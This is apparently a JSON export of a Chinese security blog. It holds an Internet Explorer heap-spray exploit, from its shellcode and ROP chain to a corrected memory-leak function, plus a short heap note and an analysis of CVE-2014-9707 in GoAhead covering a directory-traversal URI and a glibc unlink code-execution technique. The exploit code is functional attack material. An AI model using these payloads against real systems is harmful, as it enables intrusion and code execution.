9f14%u87bf%ue2f7%ub80c%u903d%u14b0%u25bb%u7d96%u1a7f%u79f5%uf809%u347c%u7b91%u4e47%ueb81%ue122%ud41b%u7074%ub21d%u2d72%u928d%ub3b1%ua905%u71b4%u4b0c%u9343%u0d76%u989f%u84b5%ub7d5%u4666%ube40%ub8bf%u201c%u48e2%u4a73%u6b2c%u2afc%u04e0%u4941%u3777%u10ba%u7ed6%u332f%ub9fd%u7a9b%u7875%u2415%u1299%uf9d2%u3f97%ub63c%u3567%u27a8%ue386%u7742%u4f73%ue380%ua93c%u757c%uf62b%ud0c0%u27e0%u214b%ue1d3%ub93f%u157d%u8c14%ue2c1%u9904%u7498%u7071%u6637%ueb28%u4e1c%u7fb6%u357b%u3297%u25d4%uf569%u9105%u4047%u0224%u78d6%u7941%uba3d%u49b1%u7276%u1d2f%u85bf%u67fc%u7e92%u4a2c%u7ab4%u1348%u93d5%u8d9b%u03bb%u74fd%u0879%u43e1%ue083%u1873%u46e3%u2372%ub2f8%u88b0%ub8f9%u969f%u75b5%u770c%u7b42%ub72d%u7aa8%ue219%ueb38%ub334%u90be%u4f7e%u0d7f%ub3b6%u3076%ubff5%u479f%u7167%ud40a%u3b7c%u66fc%u41b7%u9615%u3dfd%u3505%ub825%u1c7d%ub54a%u3940%u37d6%u3f92%u971d%u1478%u8d49%ua8b2%u3493%u2c3c%u902f%ud54f%u04a9%u1198%u91f8%ub99b%u9943%ubbb1%u0d70%u4824%u4b0c%ube4e%ub02d%uf93a%u27ba%ub446%udb42%ud9d1%u2474%u5af4%uc929%u49b1%u8cbe%uc04a%u31a0%u1972%uc283%u0304%u1572%ubf6e%u483c%u40e7%u89bd%uc997%ub858%uae85%ue929%ua419%u027c%ue8d2%u9194%u2496%u129a%u131c%ua395%u9b91%u6779%u67b0%ub480%u5912%uc94b%u9e53%u22b6%u7701%u91bc%ufcb5%u2980%ud2b4%u128e%u57ce%ue650%u5964%u5781%u11f3%ud339%u825b%u3038%ufeb8%u3d73%u740a%u9782%u7543%ud7b4%u480f%uda78%u8c4e%u05bf%ue625%ub8c3%u3d3d%u66b9%ua0c8%uec19%u016a%u219b%uc2ec%u8e97%u8c7b%u11bb%ua6a8%u9ac0%u694f%ud841%uad6b%uba09%uf412%u6df7%ue62b%ud150%u6c89%u0672%u2eab%ueb1b%ud081%u63db%ua392%u2ce9%u2c08%ua442%uab96%u9fa5%u236e%u2058%u6d8e%u749f%u05de%uf536%ud5b5%u20b7%u8619%u9b17%u76d9%u4bd8%u9cb1%ub4d7%u9ea1%udd3d%u644b%u22d6%u6723%ucb43%u6831%u579a%u8ebc%u77f6%u19e8%ue16f%ud2b1%uee0e%u9f6c%u6411%u5f82%u8ddf%u73ef%u7d88%u2eba%u811f%u4411%u17a0%ucf9d%u8ff7%u369f%u103f%u1d60%u994b%udef4%ue624%udf18%ub0b4%udf72%u64dc%u8c26%u6af9%ua0f3%uff51%u90fb%ua806%u1e93%u9e70%ue03c%u1e57%u3701%ua49e%u3d73%u64f2\");var rop_chain = heapobj.tab2uni(heapobj, heapobj.rop_chain(mshtmlbase)) ;var shellcode = rop_chain + codewhile (shellcode.length &lt; 100000)shellcode = shellcode + shellcode;var onemeg = shellcode.substr(0, 64*1024/2);for (i=0; i&lt;14; i++) &#123;onemeg += shellcode.substr(0, 64*1024/2);&#125;onemeg += shellcode.substr(0, (64*1024/2)-(38/2));var spray = new Array();for (i=0; i&lt;400; i++) &#123;spray[i] = onemeg.substr(0, onemeg.length);&#125;&#125;function smash_vtable()&#123; var obj_col_0 = document.getElementById(\"132\"); obj_col_0.width = \"1178993\"; // smash the vftable 0x07070024 obj_col_0.span = \"44\"; // the amount to overwrite&#125;var mshtmlbase = \"\";setTimeout(\"over_trigger();\",1); setTimeout(\"heap_spray();\",400);setTimeout(\"smash_vtable();\",700);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 我觉得吧，上面的over_trigger函数实现有点不对啊。 让咱仔细说说为啥不对，溢出时内存布局大致如下 溢出后，over_trigger函数被执行，它从arr数组中搜索被修改的字符串，搜索到之后偏移0x100-6个字节去获取CButtonLayout的虚表指针。也就是说，它总是当作自己搜索到被修改的字符串对象是BBBB....，然而它很有可能获取的是AAAA...的对象啊，因为溢出时，从VulHeap开始到BBBB...的内存都被覆盖了（并不完全覆盖整片内存，而是间隔覆盖，具体看书)，arr数组中，AA...的对象总是在B...的前面，所以一旦AAA...对象的长度被覆盖的话，那么over_trigger获取mshtml的基址将是错误的。。。 修改后的over_trigger123456789101112131415function over_trigger() &#123; var leak_addr = -1; for ( var i = 0; i &lt; 500; i+=2 ) &#123; if ( arr[i].length &gt; (0x100-6)/2 ) &#123; // overflowedleak_index = i; var leak = arr[i].substring((0x100-6)/2+(2+8)/2, (0x100-6)/2+(2+8+4)/2); leak_addr = parseInt( leak.charCodeAt(1).toString(16) + leak.charCodeAt(0).toString(16), 16 );mshtmlbase = leak_addr - Number(0x001582b8);alert(mshtmlbase); break; &#125; &#125; if ( leak_addr == -1 || leak_index == -1 ) &#123; alert(\"memory leak failed....\"); &#125;//return mshtmlbase;&#125;","tags":[{"name":"漏洞战争","slug":"漏洞战争","permalink":"http://www.ench4nt3r.com/tags/漏洞战争/"},{"name":"exploit","slug":"exploit","permalink":"http://www.ench4nt3r.com/tags/exploit/"}]},{"title":"WindowsXP堆思维导图","date":"2016-10-03T16:00:01.000Z","path":"2016/10/04/WindowsXP堆思维导图/","text":"环境：Windows pro sp3 参考《软件调试》","tags":[{"name":"Windows","slug":"Windows","permalink":"http://www.ench4nt3r.com/tags/Windows/"},{"name":"堆","slug":"堆","permalink":"http://www.ench4nt3r.com/tags/堆/"}]},{"title":"CVE-2014-9707分析以及exp构造","date":"2016-07-06T16:03:40.000Z","path":"2016/07/07/CVE-2014-9707分析及EXP构造/","text":"0x00 介绍 Embedthis Software GoAhead是美国Embedthis Software公司的一款嵌入式Web服务器。Embedthis Software GoAhead 3.0.0版本至3.4.1版本中存在安全漏洞，该漏洞源于程序没有正确处理以‘.’字符开始的路径部分。远程攻击者可借助特制的URI利用该漏洞实施目录遍历攻击，造成拒绝服务（基于堆的缓冲区溢出和崩溃），也可能执行任意代码。[1] 0x01 环境Ubuntu 15.10(I686，关闭ASLR、NX) Goahead 3.4.1 Glibc 2.19 0x02 漏洞产生分析瞧瞧代码12345678910111213for (mark = sp = dupPath; *sp; sp++) &#123; if (*sp == '/') &#123; *sp = '\\0'; while (sp[1] == '/') &#123; sp++; &#125; segments[nseg++] = mark; len += (int) (sp - mark); mark = sp + 1; &#125;&#125;segments[nseg++] = mark;len += (int) (sp - mark); 在函数websNormalizeUriPath中，第一个for代码块，会将URI以’/‘分割，放入数组，并且统计URI字符串长度（不包括’/‘）。 来，让我们举个栗子看下。 websNormalizeUriPath收到了一个字符串参数，内容是”/hello/./world/.x”。第一个for君勤勤恳恳地工作，将字符串以’/‘分割并且统计好长度。此时各个变量的内容是这样的：123456789101112131415segments[0]: '\\0'segments[1]: 'hello'segments[2]: '.'segments[3]: 'world'segments[4]: '.x'segments[5] : '\\0'len: 13nseg : 5 现在来到了最重要的时刻，第二个for君要上场工作了。先看下它长啥样。123456789101112131415161718192021222324for (j = i = 0; i &lt; nseg; i++, j++) &#123; sp = segments[i]; if (sp[0] == '.') &#123; if (sp[1] == '\\0') &#123; if ((i+1) == nseg) &#123; segments[j] = \"\"; &#125; else &#123; j--; &#125; &#125; else if (sp[1] == '.' &amp;&amp; sp[2] == '\\0') &#123; if (i == 1 &amp;&amp; *segments[0] == '\\0') &#123; j = 0; &#125; else if ((i+1) == nseg) &#123; if (--j &gt;= 0) &#123; segments[j] = \"\"; &#125; &#125; else &#123; j = max(j - 2, -1); &#125; &#125; &#125; else &#123; segments[j] = segments[i]; &#125;&#125; segments同时肩负输入和输出的重任，i控制输入流的偏移，j控制输出流的偏移。 此时有两种情况处理，当sp为 ‘.’ 时，做一些操作。当sp不为 ‘.’ 时，直接将输入复制到输出。 仔细瞧瞧当sp为’.’时的处理，它做了以下的动作： 当下一个字符为0时，如果输出流到了末尾时((i+1) == nseg)，直接复制空字符串到输出流。否则输出流不变(j–，在for的循环表达式中j++，以保持不变） 当下一个字符为 ‘.’ 并且sp[2]为0时，也就是sp为 “..”时。做*操作。（这里不讲了，不是重点。） 重点来了，如果sp不是上面两种情况，将会啥都不做，比如sp为”.x”的话，那么它啥也不做，并且在for的循环表达式中将i跟j自增。 继续举个栗子瞧瞧： 还是以上面的字符串为例“/hello/./world/.x” ‘hello’直接从输入复制到输出 ‘.’，j - 1。以保持不变 ‘world’，将输入复制到输出。注意，在第2步中因为j不变，所以j现在是2，也就是’.’的位置。 ‘.x’，啥也不做，i++，j++。 到这里已经结束了，nseg为5，现在i也是5了，j为4 看看调整后segments的内容：1234567891011segments[0]: '\\0' // 长度 0segments[1]: 'hello' // 长度 5segments[2]: 'world' // 长度 5segments[3]: 'world' // 长度 5segments[4]: '.x' // 长度 2segments[5] : '\\0' 继续往下走12345678910111213nseg = j;assert(nseg &gt;= 0);if ((path = walloc(len + nseg + 1)) != 0) &#123; for (i = 0, dp = path; i &lt; nseg; ) &#123; strcpy(dp, segments[i]); len = (int) slen(segments[i]); dp += len; if (++i &lt; nseg || (nseg == 1 &amp;&amp; *segments[0] == '\\0' &amp;&amp; firstc == '/')) &#123; *dp++ = '/'; &#125; &#125; *dp = '\\0';&#125; len使用的还是分割时计算的（13）。nseg被改成了j（4）。 看看上面调整后segments内字符串的长度：0 + 5 + 5 + 5 = 15。(nseg为4） path new时的长度是13 + 4 + 1 (len + nseg + 1)，而复制到path的字符串长度将是15 + 3 + 1。 很明显，在这发生了溢出。只要稍微构造一下就能触发unlink了。 漏洞分析完毕。 0x03 目录遍历来，我们准备了这么一个字符串”/../../../../../.x/.x/.x/.x/.x/.x/etc/passwd”，在第二个for君的处理中，遇到”..”并且没到末尾的话，会将j-1，或者置0。 在处理了一连串的”..”之后，遇到了”.x”，我们知道它只会将i、j加1。看看处理完之后的segments吧123456789101112131415161718192021(gdb) p segments[0]$9 = 0x8055a30 \"\"(gdb) p segments[1]$10 = 0x8055a31 \"..\"(gdb) p segments[2]$11 = 0x8055a34 \"..\"(gdb) p segments[3]$12 = 0x8055a37 \"..\"(gdb) p segments[4]$13 = 0x8055a3a \"..\"(gdb) p segments[5]$14 = 0x8055a3d \"..\"(gdb) p segments[6]$15 = 0x8055a52 \"etc\"(gdb) p segments[7]$16 = 0x8055a56 \"passwd\"(gdb) p segments[8]$17 = 0x8055a46 \".x\"(gdb) p nseg $23 = 8 详情请看参考[2]的Directory traversal 0x04 远程命令执行当执行到wfree(dupPath);的时候，内存布局大概如下： path是能通过url控制的区域，只要溢出并且覆盖top的size（重点是覆盖点p位，置为0），这样的话，当free(segments)时，就会判断path是否为空闲，由于前面被我们将top的p位置为0，所以此时会unlink(path)。通过在path准备点蛋糕，就可以让shellcode执行了。 蛋糕打造过程：因为glibc 2.19在unlink判断了fd和bk，所以想要直接通过fd和bk来覆盖函数地址是不可能了。12345678910111213141516171819202122232425262728#define unlink(P, BK, FD) &#123; \\ FD = P-&gt;fd; \\ BK = P-&gt;bk; \\ if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) \\ malloc_printerr (check_action, \"corrupted double-linked list\", P); \\ else &#123; \\ FD-&gt;bk = BK; \\ BK-&gt;fd = FD; \\ if (!in_smallbin_range (P-&gt;size) \\ &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123; \\ assert (P-&gt;fd_nextsize-&gt;bk_nextsize == P); \\ assert (P-&gt;bk_nextsize-&gt;fd_nextsize == P); \\ if (FD-&gt;fd_nextsize == NULL) &#123; \\ if (P-&gt;fd_nextsize == P) \\ FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD; \\ else &#123; \\ FD-&gt;fd_nextsize = P-&gt;fd_nextsize; \\ FD-&gt;bk_nextsize = P-&gt;bk_nextsize; \\ P-&gt;fd_nextsize-&gt;bk_nextsize = FD; \\ P-&gt;bk_nextsize-&gt;fd_nextsize = FD; \\ &#125; \\ &#125; else &#123; \\ P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize; \\ P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize; \\ &#125; \\ &#125; \\ &#125; \\&#125; glibc 2.19的unlink如上。 从代码可以看出，Relase模式下，是对fd_nextsize和bk_nextsize没有进行判断的，但是fd_nextsize和bk_nextsize是在large blocks才有的，所以需要构造一个大于512字节(32位系统）的块。 我构造的path: 当segments被释放时，path会被认为是已经释放了的块，所以会触发consolidate forward。fd和bk都指向path的地址，以通过”corrupted double-linked list”检查。 exp执行结果: 0x05 参考[1]SCAP中文社区 [2]Advisory: CVE-2014-9707 [3]Understanding glibc malloc","tags":[{"name":"漏洞分析","slug":"漏洞分析","permalink":"http://www.ench4nt3r.com/tags/漏洞分析/"}]}]